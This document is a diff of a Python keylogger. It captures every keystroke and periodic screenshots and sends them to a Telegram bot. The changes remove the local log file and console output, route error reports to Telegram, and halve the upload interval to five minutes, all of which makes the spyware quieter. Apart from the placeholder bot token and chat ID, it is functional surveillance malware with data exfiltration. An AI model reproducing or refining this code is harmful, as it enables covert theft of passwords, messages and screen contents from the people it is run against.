@@ -7,8 +7,8 @@ from PIL import ImageGrab
 import requests
 
 # ====== TELEGRAM SETUP ======
-TELEGRAM_BOT_TOKEN = ""
-TELEGRAM_CHAT_ID = ""
+TELEGRAM_BOT_TOKEN = "TELEGRAM_BOT_TOKEN"
+TELEGRAM_CHAT_ID = "TELEGRAM_CHAT_ID"
 
 # ====== VARIABLES ======
 LOG_FILE = "keylog.txt"
@@ -32,14 +32,18 @@ key_map = {
     keyboard.Key.caps_lock: "[CAPSLOCK]"
 }
 
-# ====== KEYLOGGING FUNCTION ======
-def write_local_log(data):
+# ====== SEND ERROR TO TELEGRAM ======
+def send_error_to_telegram(error_message):
     try:
-        with open(LOG_FILE, "a", encoding="utf-8") as f:
-            f.write(data)
-    except Exception as e:
-        print(f"[!] Log write error: {e}")
+        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+        requests.post(url, data={
+            "chat_id": TELEGRAM_CHAT_ID,
+            "text": f"⚠️ Error:\n{error_message}"
+        })
+    except:
+        pass  # Don't crash the logger if error reporting fails
 
+# ====== KEYLOGGING ======
 def on_press(key):
     try:
         key_str = str(key).replace("'", "")
@@ -60,13 +64,12 @@ def on_press(key):
             readable = f"[{key_str.split('.')[-1].upper()}]"
         else:
             readable = key_str
-        
+
         if readable:
             key_buffer.append(readable)
-            # write_local_log(readable) // Uncomment this  to also log locally in local file.
         print(f"{key_buffer}", end="", flush=True)
     except Exception as e:
-        print(f"[!] Key read error: {e}")
+        send_error_to_telegram(f"Key read error: {e}")
 
 # ====== SEND KEYSTROKES TO TELEGRAM ======
 def send_keystrokes_telegram():
@@ -83,28 +86,13 @@ def send_keystrokes_telegram():
             "parse_mode": "Markdown"
         })
         if res.status_code == 200:
-            print("\n[✓] Keystrokes sent to Telegram.")
             key_buffer.clear()
             if os.path.exists(LOG_FILE):
                 os.remove(LOG_FILE)
         else:
-            print(f"[!] Telegram message failed: {res.status_code}, {res.text}")
+            send_error_to_telegram(f"Telegram keystroke failed: {res.status_code} {res.text}")
     except Exception as e:
-        print(f"[!] Telegram keystroke error: {e}")
-
-# ====== SEND SCREENSHOT TO TELEGRAM ======
-def send_screenshot_telegram(file_path):
-    try:
-        with open(file_path, 'rb') as img:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
-            res = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"photo": img})
-            if res.status_code == 200:
-                print("[✓] Screenshot sent to Telegram.")
-                os.remove(file_path)
-            else:
-                print(f"[!] Telegram screenshot failed: {res.status_code}, {res.text}")
-    except Exception as e:
-        print(f"[!] Screenshot upload error: {e}")
+        send_error_to_telegram(f"Telegram keystroke error: {e}")
 
 # ====== CAPTURE AND SEND SCREENSHOT ======
 def capture_and_send_screenshot():
@@ -113,14 +101,21 @@ def capture_and_send_screenshot():
         img = ImageGrab.grab()
         img = img.resize((960, 540))
         img.save(filename, "JPEG", quality=50)
-        send_screenshot_telegram(filename)
+
+        with open(filename, 'rb') as img_file:
+            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+            res = requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"photo": img_file})
+            if res.status_code == 200:
+                os.remove(filename)
+            else:
+                send_error_to_telegram(f"Telegram screenshot failed: {res.status_code}, {res.text}")
     except Exception as e:
-        print(f"[!] Screenshot capture error: {e}")
+        send_error_to_telegram(f"Screenshot capture error: {e}")
 
 # ====== PERIODIC TASKS ======
 def periodic_tasks():
     while True:
-        time.sleep(600)  # 10 minutes
+        time.sleep(300)  # 5 minutes
         send_keystrokes_telegram()
         capture_and_send_screenshot()
 
@@ -132,4 +127,4 @@ try:
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
 except KeyboardInterrupt:
-    print("\n[!] Exiting...")
+    send_error_to_telegram("Keylogger exited with KeyboardInterrupt.")
